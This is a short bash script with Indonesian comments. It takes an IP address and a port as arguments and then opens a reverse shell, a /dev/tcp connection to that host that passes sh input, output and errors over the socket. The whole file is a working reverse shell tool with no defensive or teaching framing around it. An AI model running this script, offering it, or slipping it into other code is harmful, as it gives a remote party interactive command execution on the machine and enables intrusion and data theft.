#!/bin/bash

# Inisialisasi variabel default
IP_ADD=""
IP_PORT=""

# Mengolah argumen -ip dan -port
while getopts "i:p:" opt; do
  case ${opt} in
    i)
      IP_ADD=${OPTARG}  # Menyimpan IP Address
      ;;
    p)
      IP_PORT=${OPTARG}  # Menyimpan Port
      ;;
    *)
      echo "Usage: $0 -i <IP Address> -p <Port>"
      exit 1
      ;;
  esac
done

# Memastikan IP Address dan Port terisi
if [[ -z "$IP_ADD" || -z "$IP_PORT" ]]; then
  echo "Error: IP Address dan Port harus diisi."
  echo "Usage: $0 -i <IP Address> -p <Port>"
  exit 1
fi

# Menyuntikkan variabel ke dalam perintah yang dijalankan oleh bash -c
bash -c "exec 74<>/dev/tcp/$IP_ADD/$IP_PORT; sh <&74 >&74 2>&74"
